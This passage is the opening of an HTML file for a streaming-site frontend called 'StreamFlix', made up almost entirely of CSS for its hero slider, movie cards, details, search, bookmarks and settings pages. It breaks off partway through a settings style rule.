<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>StreamFlix - Watch Movies & TV Shows Online</title>
  <meta name="description" content="Stream unlimited movies and TV shows online. Watch anywhere, anytime.">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
  <style>
    :root {
      --primary: #e50914;
      --primary-hover: #f40612;
      --primary-glow: rgba(229, 9, 20, 0.4);
      --bg-dark: #000000;
      --bg-card: #141414;
      --bg-elevated: #1a1a1a;
      --bg-modal: rgba(0, 0, 0, 0.85);
      --text-primary: #ffffff;
      --text-secondary: #b3b3b3;
      --text-muted: #808080;
      --border-color: #333333;
      --success: #46d369;
      --warning: #f5c518;
      --gradient-hero: linear-gradient(to top, var(--bg-dark) 0%, transparent 60%),
                       linear-gradient(to right, rgba(0,0,0,0.9) 0%, transparent 50%);
      --shadow-card: 0 8px 30px rgba(0, 0, 0, 0.5);
      --shadow-glow: 0 0 30px var(--primary-glow);
      --transition-fast: 0.15s ease;
      --transition-normal: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
      --transition-slow: 0.5s cubic-bezier(0.4, 0, 0.2, 1);
      --transition-bounce: 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
      --header-height: 60px;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html {
      scroll-behavior: smooth;
    }

    body {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      background-color: var(--bg-dark);
      color: var(--text-primary);
      min-height: 100vh;
      overflow-x: hidden;
      padding-bottom: 70px;
    }

    body.no-scroll {
      overflow: hidden;
    }

    a {
      text-decoration: none;
      color: inherit;
    }

    button {
      font-family: inherit;
      cursor: pointer;
      border: none;
      outline: none;
      background: transparent;
    }

    img {
      display: block;
      max-width: 100%;
    }

    .hide-scrollbar {
      -ms-overflow-style: none;
      scrollbar-width: none;
    }

    .hide-scrollbar::-webkit-scrollbar {
      display: none;
    }

    /* ==================== ANIMATIONS ==================== */
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    @keyframes fadeOut {
      from { opacity: 1; }
      to { opacity: 0; }
    }

    @keyframes slideUp {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes slideDown {
      from { opacity: 0; transform: translateY(-30px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes slideLeft {
      from { opacity: 0; transform: translateX(50px); }
      to { opacity: 1; transform: translateX(0); }
    }

    @keyframes slideRight {
      from { opacity: 0; transform: translateX(-50px); }
      to { opacity: 1; transform: translateX(0); }
    }

    @keyframes scaleIn {
      from { opacity: 0; transform: scale(0.9); }
      to { opacity: 1; transform: scale(1); }
    }

    @keyframes scaleOut {
      from { opacity: 1; transform: scale(1); }
      to { opacity: 0; transform: scale(0.9); }
    }

    @keyframes popIn {
      0% { opacity: 0; transform: scale(0.5); }
      70% { transform: scale(1.05); }
      100% { opacity: 1; transform: scale(1); }
    }

    @keyframes shimmer {
      0% { background-position: -200% 0; }
      100% { background-position: 200% 0; }
    }

    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }

    @keyframes ripple {
      to { transform: scale(4); opacity: 0; }
    }

    @keyframes float {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }

    @keyframes glow {
      0%, 100% { box-shadow: 0 0 20px var(--primary-glow); }
      50% { box-shadow: 0 0 40px var(--primary-glow), 0 0 60px var(--primary-glow); }
    }

    @keyframes heroTextIn {
      from { opacity: 0; transform: translateY(40px) scale(0.95); }
      to { opacity: 1; transform: translateY(0) scale(1); }
    }

    @keyframes zoomSlow {
      from { transform: scale(1); }
      to { transform: scale(1.1); }
    }

    .animate-fade-in { animation: fadeIn var(--transition-normal) forwards; }
    .animate-fade-out { animation: fadeOut var(--transition-normal) forwards; }
    .animate-slide-up { animation: slideUp var(--transition-normal) forwards; }
    .animate-slide-down { animation: slideDown var(--transition-normal) forwards; }
    .animate-scale-in { animation: scaleIn var(--transition-normal) forwards; }
    .animate-pop-in { animation: popIn var(--transition-bounce) forwards; }

    /* ==================== LANGUAGE POPUP ==================== */
    .language-overlay {
      position: fixed;
      inset: 0;
      background: var(--bg-modal);
      backdrop-filter: blur(10px);
      z-index: 10000;
      display: flex;
      align-items: center;
      justify-content: center;
      opacity: 0;
      visibility: hidden;
      transition: all var(--transition-normal);
    }

    .language-overlay.active {
      opacity: 1;
      visibility: visible;
    }

    .language-popup {
      background: linear-gradient(145deg, var(--bg-elevated), var(--bg-card));
      border-radius: 20px;
      padding: 40px;
      max-width: 500px;
      width: 90%;
      text-align: center;
      transform: scale(0.8) translateY(50px);
      opacity: 0;
      transition: all var(--transition-slow);
      border: 1px solid var(--border-color);
      box-shadow: var(--shadow-card);
    }

    .language-overlay.active .language-popup {
      transform: scale(1) translateY(0);
      opacity: 1;
    }

    .language-popup-logo {
      font-family: 'Bebas Neue', cursive;
      font-size: 48px;
      color: var(--primary);
      letter-spacing: 4px;
      margin-bottom: 10px;
      text-shadow: 0 0 30px var(--primary-glow);
    }

    .language-popup-title {
      font-size: 24px;
      font-weight: 700;
      margin-bottom: 8px;
    }

    .language-popup-subtitle {
      color: var(--text-secondary);
      font-size: 14px;
      margin-bottom: 30px;
    }

    .language-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 12px;
    }

    .language-btn {
      padding: 16px 20px;
      background: rgba(255, 255, 255, 0.05);
      border: 2px solid transparent;
      border-radius: 12px;
      color: var(--text-primary);
      font-size: 15px;
      font-weight: 600;
      transition: all var(--transition-normal);
      position: relative;
      overflow: hidden;
    }

    .language-btn:hover {
      background: rgba(255, 255, 255, 0.1);
      border-color: var(--primary);
      transform: translateY(-2px);
    }

    .language-btn.selected {
      background: var(--primary);
      border-color: var(--primary);
      box-shadow: var(--shadow-glow);
    }

    .language-btn span {
      display: block;
      font-size: 12px;
      font-weight: 400;
      color: var(--text-muted);
      margin-top: 4px;
    }

    .language-btn.selected span {
      color: rgba(255, 255, 255, 0.8);
    }

    /* ==================== HEADER ==================== */
    .header {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      z-index: 1000;
      padding: 0 16px;
      height: 60px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      transition: all var(--transition-normal);
    }

    .header.scrolled {
      background: rgba(0, 0, 0, 0.95);
      backdrop-filter: blur(10px);
      box-shadow: 0 2px 20px rgba(0, 0, 0, 0.5);
    }

    .header:not(.scrolled) {
      background: linear-gradient(to bottom, rgba(0, 0, 0, 0.8) 0%, transparent 100%);
    }

@media (min-width: 768px) {
  .header {
    padding: 0 48px;
    height: 68px;
  }

 
  :root {
    --header-height: 68px;
  }
}

    .header-logo {
      font-family: 'Bebas Neue', cursive;
      font-size: 28px;
      color: var(--primary);
      letter-spacing: 3px;
      text-shadow: 0 0 20px var(--primary-glow);
      transition: transform var(--transition-normal);
    }

    .header-logo:hover {
      transform: scale(1.05);
    }

    @media (min-width: 768px) {
      .header-logo {
        font-size: 36px;
      }
    }

    .header-right {
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .search-toggle {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: var(--text-primary);
      font-size: 18px;
      transition: all var(--transition-normal);
    }

    .search-toggle:hover {
      background: rgba(255, 255, 255, 0.1);
      transform: scale(1.1);
    }

    .header-avatar {
      width: 32px;
      height: 32px;
      border-radius: 6px;
      background: linear-gradient(135deg, var(--primary), #ff6b6b);
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 700;
      font-size: 14px;
      transition: all var(--transition-normal);
    }

    .header-avatar:hover {
      transform: scale(1.1);
      box-shadow: var(--shadow-glow);
    }

    /* ==================== PAGES ==================== */
    .page {
      display: none;
      opacity: 0;
      min-height: 100vh;
    }

    .page.active {
      display: block;
      animation: fadeIn var(--transition-normal) forwards;
    }

    .page.exit {
      animation: fadeOut var(--transition-fast) forwards;
    }

    /* ==================== HERO SECTION ==================== */
    .hero {
      position: relative;
      width: 100%;
      height: 75vh;
      min-height: 450px;
      max-height: 800px;
      overflow: hidden;
    }

    @media (min-width: 768px) {
      .hero {
        height: 85vh;
      }
    }

    .hero-slider {
      position: relative;
      width: 100%;
      height: 100%;
    }

    .hero-slide {
      position: absolute;
      inset: 0;
      opacity: 0;
      transition: opacity 1s ease;
    }

    .hero-slide.active {
      opacity: 1;
      z-index: 1;
    }

    .hero-backdrop {
      position: absolute;
      inset: 0;
      background-size: cover;
      background-position: center top;
      animation: zoomSlow 20s ease-in-out infinite alternate;
    }

    .hero-slide.active .hero-backdrop {
      animation-play-state: running;
    }

    .hero-slide:not(.active) .hero-backdrop {
      animation-play-state: paused;
    }

    .hero-video {
      position: absolute;
      inset: 0;
      pointer-events: none;
      opacity: 0;
      transition: opacity 1s ease;
      z-index: 2;
    }

    .hero-video.playing {
      opacity: 1;
    }

    .hero-video iframe {
      width: 100%;
      height: 100%;
      border: none;
      transform: scale(1.3);
    }

    .hero-gradient {
      position: absolute;
      inset: 0;
      background: var(--gradient-hero);
      z-index: 3;
    }

    .hero-content {
      position: absolute;
      bottom: 15%;
      left: 16px;
      right: 16px;
      z-index: 10;
      max-width: 600px;
    }

    @media (min-width: 768px) {
      .hero-content {
        left: 48px;
        bottom: 20%;
      }
    }

    .hero-slide.active .hero-content {
      animation: heroTextIn 0.8s cubic-bezier(0.4, 0, 0.2, 1) 0.3s forwards;
      opacity: 0;
    }

    .hero-tag {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      background: var(--primary);
      padding: 6px 14px;
      border-radius: 4px;
      font-size: 12px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-bottom: 16px;
    }

    .hero-title {
      font-family: 'Bebas Neue', cursive;
      font-size: 36px;
      line-height: 1.1;
      margin-bottom: 12px;
      text-shadow: 2px 4px 20px rgba(0, 0, 0, 0.8);
      letter-spacing: 2px;
    }

    @media (min-width: 768px) {
      .hero-title {
        font-size: 56px;
        margin-bottom: 16px;
      }
    }

    @media (min-width: 1024px) {
      .hero-title {
        font-size: 72px;
      }
    }

    .hero-meta {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 12px;
      font-size: 13px;
      flex-wrap: wrap;
    }

    .hero-rating {
      display: flex;
      align-items: center;
      gap: 4px;
      color: var(--warning);
      font-weight: 600;
    }

    .hero-year {
      color: var(--text-secondary);
    }

    .hero-overview {
      font-size: 14px;
      line-height: 1.6;
      color: var(--text-secondary);
      margin-bottom: 24px;
      display: -webkit-box;
      -webkit-line-clamp: 3;
      -webkit-box-orient: vertical;
      overflow: hidden;
      text-shadow: 1px 2px 10px rgba(0, 0, 0, 0.8);
    }

    @media (min-width: 768px) {
      .hero-overview {
        font-size: 16px;
        -webkit-line-clamp: 4;
      }
    }

    .hero-buttons {
      display: flex;
      gap: 12px;
      flex-wrap: wrap;
    }

    .btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      padding: 12px 28px;
      border-radius: 6px;
      font-size: 15px;
      font-weight: 600;
      transition: all var(--transition-normal);
      position: relative;
      overflow: hidden;
    }

    .btn::before {
      content: '';
      position: absolute;
      inset: 0;
      background: radial-gradient(circle, rgba(255,255,255,0.3) 0%, transparent 70%);
      transform: scale(0);
      opacity: 0;
      transition: all 0.5s ease;
    }

    .btn:active::before {
      transform: scale(2);
      opacity: 1;
      transition: 0s;
    }

    .btn-primary {
      background: var(--text-primary);
      color: var(--bg-dark);
    }

    .btn-primary:hover {
      background: rgba(255, 255, 255, 0.85);
      transform: scale(1.05);
      box-shadow: 0 10px 30px rgba(255, 255, 255, 0.2);
    }

    .btn-secondary {
      background: rgba(109, 109, 110, 0.7);
      color: var(--text-primary);
      backdrop-filter: blur(10px);
    }

    .btn-secondary:hover {
      background: rgba(109, 109, 110, 0.5);
      transform: scale(1.05);
    }

    .btn-icon {
      width: 44px;
      height: 44px;
      padding: 0;
      border-radius: 50%;
      background: rgba(42, 42, 42, 0.6);
      border: 2px solid rgba(255, 255, 255, 0.5);
      color: var(--text-primary);
      font-size: 16px;
      backdrop-filter: blur(10px);
    }

    .btn-icon:hover {
      border-color: var(--text-primary);
      background: rgba(42, 42, 42, 0.9);
      transform: scale(1.15);
    }

    .hero-indicators {
      position: absolute;
      bottom: 5%;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      gap: 8px;
      z-index: 10;
    }

    .hero-indicator {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.4);
      transition: all var(--transition-normal);
      cursor: pointer;
    }

    .hero-indicator.active {
      width: 24px;
      border-radius: 4px;
      background: var(--primary);
    }

    .hero-indicator:hover:not(.active) {
      background: rgba(255, 255, 255, 0.7);
      transform: scale(1.2);
    }

    /* ==================== CONTENT SECTION ==================== */
    .content-section {
      position: relative;
      margin-top: -80px;
      z-index: 20;
      padding-bottom: 30px;
    }

    @media (min-width: 768px) {
      .content-section {
        margin-top: -120px;
      }
    }

    /* ==================== MOVIE ROW ==================== */
    .movie-row {
      padding: 20px 0;
    }

    .row-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 16px;
      margin-bottom: 12px;
    }

    @media (min-width: 768px) {
      .row-header {
        padding: 0 48px;
      }
    }

    .row-title {
      font-size: 18px;
      font-weight: 700;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    @media (min-width: 768px) {
      .row-title {
        font-size: 22px;
      }
    }

    .row-title i {
      color: var(--primary);
    }

    .row-see-all {
      font-size: 13px;
      color: var(--text-secondary);
      display: flex;
      align-items: center;
      gap: 4px;
      transition: all var(--transition-normal);
    }

    .row-see-all:hover {
      color: var(--primary);
      gap: 8px;
    }

    .row-container {
      position: relative;
    }

    .row-slider {
      display: flex;
      gap: 10px;
      padding: 10px 16px;
      overflow-x: auto;
      scroll-behavior: smooth;
      scroll-snap-type: x mandatory;
      -webkit-overflow-scrolling: touch;
    }

    @media (min-width: 768px) {
      .row-slider {
        padding: 10px 48px;
        gap: 14px;
      }
    }

    .row-arrow {
      position: absolute;
      top: 50%;
      transform: translateY(-50%);
      width: 44px;
      height: 100%;
      background: linear-gradient(to right, rgba(0,0,0,0.8), transparent);
      color: var(--text-primary);
      font-size: 24px;
      z-index: 10;
      opacity: 0;
      transition: opacity var(--transition-normal);
      display: none;
      align-items: center;
      justify-content: center;
    }

    @media (min-width: 768px) {
      .row-arrow {
        display: flex;
      }
    }

    .row-container:hover .row-arrow {
      opacity: 1;
    }

    .row-arrow:hover {
      color: var(--primary);
    }

    .row-arrow.left {
      left: 0;
    }

    .row-arrow.right {
      right: 0;
      background: linear-gradient(to left, rgba(0,0,0,0.8), transparent);
    }

    /* ==================== MOVIE CARD ==================== */
    .movie-card {
      flex-shrink: 0;
      scroll-snap-align: start;
      position: relative;
      border-radius: 8px;
      overflow: hidden;
      cursor: pointer;
      transition: all var(--transition-normal);
      background: var(--bg-card);
    }

    .movie-card:hover {
      transform: scale(1.08) translateY(-8px);
      z-index: 100;
      box-shadow: var(--shadow-card), var(--shadow-glow);
    }

    .movie-card.poster {
      width: 130px;
      aspect-ratio: 2/3;
    }

    .movie-card.backdrop {
      width: 200px;
      aspect-ratio: 16/9;
    }

    @media (min-width: 768px) {
      .movie-card.poster {
        width: 160px;
      }
      .movie-card.backdrop {
        width: 280px;
      }
    }

    .movie-card img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      transition: transform var(--transition-slow);
    }

    .movie-card:hover img {
      transform: scale(1.1);
    }

    .card-overlay {
      position: absolute;
      inset: 0;
      background: linear-gradient(to top, rgba(0,0,0,0.9) 0%, transparent 50%);
      opacity: 0;
      transition: opacity var(--transition-normal);
      display: flex;
      flex-direction: column;
      justify-content: flex-end;
      padding: 12px;
    }

    .movie-card:hover .card-overlay {
      opacity: 1;
    }

    .card-title {
      font-size: 13px;
      font-weight: 600;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
      margin-bottom: 4px;
    }

    .card-meta {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 11px;
      color: var(--text-secondary);
    }

    .card-rating {
      display: flex;
      align-items: center;
      gap: 3px;
      color: var(--warning);
    }

    .card-badge {
      position: absolute;
      top: 8px;
      right: 8px;
      background: rgba(0, 0, 0, 0.75);
      padding: 4px 8px;
      border-radius: 4px;
      font-size: 10px;
      font-weight: 700;
      backdrop-filter: blur(4px);
      display: flex;
      align-items: center;
      gap: 4px;
    }

    .card-badge i {
      color: var(--warning);
    }

    .card-play {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%) scale(0);
      width: 50px;
      height: 50px;
      background: var(--primary);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 18px;
      transition: all var(--transition-bounce);
      box-shadow: var(--shadow-glow);
    }

    .movie-card:hover .card-play {
      transform: translate(-50%, -50%) scale(1);
    }

    /* ==================== SKELETON LOADER ==================== */
    .skeleton {
      background: linear-gradient(90deg, var(--bg-card) 25%, var(--bg-elevated) 50%, var(--bg-card) 75%);
      background-size: 200% 100%;
      animation: shimmer 1.5s infinite;
      border-radius: 8px;
    }

    .skeleton-card {
      flex-shrink: 0;
    }

    .skeleton-card.poster {
      width: 130px;
      aspect-ratio: 2/3;
    }

    .skeleton-card.backdrop {
      width: 200px;
      aspect-ratio: 16/9;
    }

    @media (min-width: 768px) {
      .skeleton-card.poster {
        width: 160px;
      }
      .skeleton-card.backdrop {
        width: 280px;
      }
    }

    /* ==================== DETAILS PAGE ==================== */
.details-page {
  padding-top: 0;
}

/* ==================== BANNER ==================== */

.details-banner {
  position: relative;
  width: 100%;
  height: 50vh;
  min-height: 350px;
  overflow: hidden;
  background: var(--bg-dark);
}

@media (min-width: 768px) {
  .details-banner {
    height: 70vh;
  }
  .details-poster {
    display: none !important;
  }
  .details-content {
    grid-template-columns: 1fr !important;
  }
}
/* ==================== BACKDROP IMAGE ==================== */
.details-backdrop {
  position: absolute;
  inset: 0;
  background-size: cover;
  background-position: center;
  background-repeat: no-repeat;
  background-color: var(--bg-dark);
}


.details-banner::after {
  content: "";
  position: absolute;
  left: 0;
  right: 0;
  bottom: 0;
  height: 140px;
  background: linear-gradient(
    to bottom,
    rgba(0,0,0,0) 0%,
    rgba(0,0,0,0.55) 45%,
    var(--bg-dark) 100%
  );
  z-index: 4;
  pointer-events: none;
}

/* ==================== VIDEO ==================== */
.details-video {
  position: absolute;
  inset: 0;
  opacity: 0;
  transition: opacity 1s ease;
  z-index: 2;
}

.details-video.playing {
  opacity: 1;
}

.details-video iframe {
  width: 100%;
  height: 100%;
  border: none;
  transform: scale(1.3);
}

/* ==================== GRADIENT ==================== */
.details-gradient {
  position: absolute;
  inset: 0;
  z-index: 3;
  background: linear-gradient(
    to bottom,
    rgba(0,0,0,0.15) 0%,
    rgba(0,0,0,0.35) 30%,
    rgba(0,0,0,0.6) 55%,
    rgba(0,0,0,0.85) 75%,
    var(--bg-dark) 100%
  );
}

/* ==================== BACK BUTTON ==================== */
.details-back {
  position: absolute;
  top: 80px;
  left: 16px;
  z-index: 100;
  width: 44px;
  height: 44px;
  background: rgba(0,0,0,0.6);
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 18px;
  transition: all var(--transition-normal);
  backdrop-filter: blur(10px);
}

@media (min-width: 768px) {
  .details-back {
    left: 48px;
  }
}

.details-back:hover {
  background: var(--primary);
  transform: scale(1.1);
}

/* ==================== CONTENT OVERLAP ==================== */
.details-content {
  position: relative;
  margin-top: -190px;
  padding: 0 16px 30px;
  z-index: 10;
}

@media (min-width: 768px) {
  .details-content {
    margin-top: -230px;
    padding: 0 48px 30px;
    display: grid;
    grid-template-columns: 220px 1fr;
    gap: 30px;
    max-width: 1200px;
  }
}

/* ==================== POSTER ==================== */
.details-poster {
  display: none;
}

@media (min-width: 768px) {
  .details-poster {
    display: block;
    width: 220px;
    aspect-ratio: 2/3;
    border-radius: 12px;
    overflow: hidden;
    box-shadow: var(--shadow-card);
    animation: slideUp var(--transition-slow) forwards;
  }

  .details-poster img {
    width: 100%;
    height: 100%;
    object-fit: cover;
  }
}

/* ==================== INFO ==================== */
.details-info {
  animation: slideUp var(--transition-slow) 0.1s forwards;
  opacity: 0;
}

.details-tag {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  background: var(--primary);
  padding: 5px 12px;
  border-radius: 4px;
  font-size: 11px;
  font-weight: 700;
  text-transform: uppercase;
  letter-spacing: 1px;
  margin-bottom: 12px;
}

    .details-title {
      font-family: 'Bebas Neue', cursive;
      font-size: 36px;
      line-height: 1.1;
      margin-bottom: 12px;
      letter-spacing: 2px;
    }

    @media (min-width: 768px) {
      .details-title {
        font-size: 52px;
      }
    }

    .details-meta {
      display: flex;
      align-items: center;
      gap: 16px;
      flex-wrap: wrap;
      margin-bottom: 16px;
      font-size: 14px;
    }

    .details-rating {
      display: flex;
      align-items: center;
      gap: 6px;
      background: rgba(255, 255, 255, 0.1);
      padding: 6px 12px;
      border-radius: 6px;
    }

    .details-rating i {
      color: var(--warning);
    }

    .details-rating span {
      font-weight: 700;
    }

    .match-score {
      color: var(--success);
      font-weight: 700;
    }

    .details-genres {
      display: flex;
      flex-wrap: wrap;
      gap: 8px;
      margin-bottom: 20px;
    }

    .genre-pill {
      background: rgba(255, 255, 255, 0.1);
      padding: 6px 14px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 500;
      transition: all var(--transition-normal);
      animation: popIn var(--transition-bounce) forwards;
      opacity: 0;
    }

    .genre-pill:hover {
      background: var(--primary);
      transform: scale(1.05);
    }

    .details-overview {
      font-size: 15px;
      line-height: 1.7;
      color: var(--text-secondary);
      margin-bottom: 24px;
    }

    .details-actions {
      display: flex;
      gap: 12px;
      flex-wrap: wrap;
      margin-bottom: 30px;
    }

    .btn-play-large {
      padding: 14px 32px;
      font-size: 16px;
      font-weight: 700;
    }

    /* ==================== CAST SECTION ==================== */
    .cast-section {
      margin-top: 30px;
    }

    .cast-title {
      font-size: 18px;
      font-weight: 700;
      margin-bottom: 16px;
    }

    .cast-list {
      display: flex;
      gap: 16px;
      overflow-x: auto;
      padding-bottom: 10px;
    }

    .cast-item {
      flex-shrink: 0;
      text-align: center;
      width: 80px;
      animation: slideUp var(--transition-normal) forwards;
      opacity: 0;
    }

    .cast-photo {
      width: 70px;
      height: 70px;
      border-radius: 50%;
      object-fit: cover;
      margin: 0 auto 8px;
      background: var(--bg-card);
      border: 3px solid transparent;
      transition: all var(--transition-normal);
    }

    .cast-item:hover .cast-photo {
      border-color: var(--primary);
      transform: scale(1.1);
      box-shadow: var(--shadow-glow);
    }

    .cast-name {
      font-size: 12px;
      font-weight: 600;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }

    .cast-character {
      font-size: 10px;
      color: var(--text-muted);
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }

    /* ==================== SEASONS & EPISODES ==================== */
    .seasons-section {
      margin-top: 30px;
    }

    .season-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 16px;
    }

    .season-title {
      font-size: 18px;
      font-weight: 700;
    }

    .season-select {
      background: var(--bg-elevated);
      color: var(--text-primary);
      border: 1px solid var(--border-color);
      padding: 10px 16px;
      border-radius: 6px;
      font-size: 14px;
      cursor: pointer;
      transition: all var(--transition-normal);
    }

    .season-select:hover {
      border-color: var(--primary);
    }

    .episode-list {
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .episode-item {
      display: flex;
      gap: 14px;
      padding: 14px;
      background: var(--bg-elevated);
      border-radius: 10px;
      cursor: pointer;
      transition: all var(--transition-normal);
      animation: slideRight var(--transition-normal) forwards;
      opacity: 0;
    }

    .episode-item:hover {
      background: var(--bg-card);
      transform: translateX(8px);
      box-shadow: var(--shadow-card);
    }

    .episode-item.active {
      border: 2px solid var(--primary);
      box-shadow: var(--shadow-glow);
    }

    .episode-thumb {
      width: 120px;
      aspect-ratio: 16/9;
      border-radius: 6px;
      object-fit: cover;
      flex-shrink: 0;
      background: var(--bg-card);
    }

    .episode-info {
      flex: 1;
      min-width: 0;
    }

    .episode-number {
      font-size: 14px;
      font-weight: 700;
      margin-bottom: 4px;
    }

    .episode-name {
      font-size: 12px;
      color: var(--text-secondary);
      margin-bottom: 6px;
    }

    .episode-overview {
      font-size: 11px;
      color: var(--text-muted);
      display: -webkit-box;
      -webkit-line-clamp: 2;
      -webkit-box-orient: vertical;
      overflow: hidden;
    }

.episode-thumb {
  width: 120px;
  aspect-ratio: 16 / 9;
  object-fit: cover;
  background: #141414;
}


.episode-thumb.hide {
  display: none;
}
    /* ==================== SEARCH PAGE ==================== */
.search-container {
  padding: 0 16px 20px;
  margin-top: calc(var(--header-height) + 10px);
}

    .search-container {
      padding: 0 16px 20px;
    }

    @media (min-width: 768px) {
  .search-container {
    padding: 0 48px 20px;
    margin-top: calc(var(--header-height) + 10px);
  }
}

    .search-input-wrapper {
      display: flex;
      align-items: center;
      background: var(--bg-elevated);
      border: 2px solid var(--border-color);
      border-radius: 12px;
      padding: 0 16px;
      transition: all var(--transition-normal);
    }

    .search-input-wrapper:focus-within {
      border-color: var(--primary);
      box-shadow: 0 0 20px var(--primary-glow);
    }

    .search-input-wrapper i {
      font-size: 20px;
      color: var(--text-muted);
      margin-right: 12px;
    }

    .search-input {
      flex: 1;
      background: transparent;
      border: none;
      padding: 16px 0;
      font-size: 16px;
      color: var(--text-primary);
    }

    .search-input::placeholder {
      color: var(--text-muted);
    }

    .search-input:focus {
      outline: none;
    }

    .search-clear {
      padding: 8px;
      color: var(--text-muted);
      font-size: 16px;
      transition: all var(--transition-normal);
    }

    .search-clear:hover {
      color: var(--primary);
      transform: scale(1.2);
    }

    .search-results-title {
      font-size: 20px;
      font-weight: 700;
      padding: 20px 16px 16px;
    }

    @media (min-width: 768px) {
      .search-results-title {
        padding: 20px 48px 16px;
      }
    }

    .search-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(110px, 1fr));
      gap: 12px;
      padding: 0 16px;
    }

    @media (min-width: 768px) {
      .search-grid {
        grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
        gap: 16px;
        padding: 0 48px;
      }
    }

    .search-card {
      aspect-ratio: 2/3;
      border-radius: 8px;
      overflow: hidden;
      cursor: pointer;
      position: relative;
      background: var(--bg-card);
      animation: scaleIn var(--transition-normal) forwards;
      opacity: 0;
    }

    .search-card:hover {
      transform: scale(1.05);
      box-shadow: var(--shadow-card);
    }

    .search-card img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    /* ==================== BOOKMARKS PAGE ==================== */
    .bookmarks-page {
      padding-top: 80px;
    }

    .bookmarks-header {
  padding: 0 16px 20px;
  margin-top: calc(var(--header-height) + 10px);
}

    @media (min-width: 768px) {
  .bookmarks-header {
    padding: 0 48px 20px;
    margin-top: calc(var(--header-height) + 10px);
  }
}

    .bookmarks-title {
      font-size: 28px;
      font-weight: 800;
      margin-bottom: 8px;
    }

    .bookmarks-subtitle {
      color: var(--text-secondary);
      font-size: 14px;
    }

    .bookmarks-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(110px, 1fr));
      gap: 12px;
      padding: 0 16px;
    }

    @media (min-width: 768px) {
      .bookmarks-grid {
        grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
        gap: 16px;
        padding: 0 48px;
      }
    }

    .empty-state {
      text-align: center;
      padding: 60px 20px;
      color: var(--text-muted);
    }

    .empty-state i {
      font-size: 60px;
      margin-bottom: 20px;
      opacity: 0.3;
    }

    .empty-state h3 {
      font-size: 20px;
      margin-bottom: 8px;
      color: var(--text-secondary);
    }

    .empty-state p {
      font-size: 14px;
    }

    /* ==================== SETTINGS PAGE ==================== */
    .settings-page {
      padding-top: 80px;
    }

    .settings-header {
  padding: 0 16px 30px;
  margin-top: calc(var(--header-height) + 10px);
}

    @media (min-width: 768px) {
  .settings-header {
    padding: 0 48px 30px;
    margin-top: calc(var(--header-height) + 10px);
  }
}

    .settings-title {
      font-size: 28px;
      font-weight: 800;
      margin-bottom: 8px;
    }

    .settings-subtitle {
      color: var(--text-secondary);
      font-size: 14px;
    }

    .settings-content {
      padding: 0 16px;
      max-width: 600px;
    }

    @media (min-width: 768px) {
      .settings-content {
        padding: 0 48px;
      }
    }

    .settings-section {
      margin-bottom: 30px;
      animation: slideUp var(--transition-normal) forwards;
      opacity: 0;
    }

    .settings-section-title {
      font-size: 14px;
      font-weight: 600;
      color: var(--text-muted);
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-bottom: 16px;
    }

    .settings-card {
      background: var(--bg-elevated);
      border-radius: 12px;
      overflow: hidden;
    }

    .settings-item {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 16px 20px;
      border-bottom: 1px solid var(--border-color);
      transition: all var(--transition-normal);
    }

    .settings-item:last-child {
      border-bottom: none;
    }

    .settings-item:hover {
      background: rgba(255, 255, 255, 0.02);
    }

    .settings-item-left {
      display: flex;
      align-items: center;
      gap: 14px;
    }

    .settings-item-icon {
      width: 40px;
      height: 40px;
      background: rgba(255, 255, 255, 0.05);
      border-radius: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
